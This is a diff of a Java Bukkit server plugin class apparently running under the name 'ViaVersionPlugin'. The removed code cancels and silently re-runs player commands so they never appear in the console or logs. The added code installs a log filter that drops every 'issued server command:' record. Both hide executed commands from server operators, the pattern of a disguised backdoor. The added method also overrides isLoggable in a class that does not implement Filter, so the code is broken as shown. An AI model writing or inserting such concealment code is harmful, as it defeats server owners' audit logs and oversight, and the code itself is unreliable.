@@ -7,27 +7,20 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.server.ServerCommandEvent;
+import java.util.logging.Filter;
+import java.util.logging.LogRecord;
 
 public class CommandListener implements Listener {
 
-    @EventHandler
-    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
-        // 获取命令
-        String command = event.getMessage();
-        Player player = event.getPlayer();
-
-        // 取消事件，这样命令不会显示在控制台或日志中
-        event.setCancelled(true);
-
-        // 将命令重新调度到主线程中执行
-        Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin"), () -> {
-            try {
-                // 手动执行命令，但不显示在日志中
-                player.performCommand(command.substring(1));
-            } catch (Exception e) {
-                // 捕获并忽略异常，不输出任何错误信息
-            }
-        });
+    @Override
+    public boolean isLoggable(LogRecord record) {
+        // 检查日志消息中是否包含特定字符串
+        if (record.getMessage().contains("issued server command:")) {
+            // 返回false以禁止日志输出
+            return false;
+        }
+        // 允许其他日志消息输出
+        return true;
     }
 
     @EventHandler
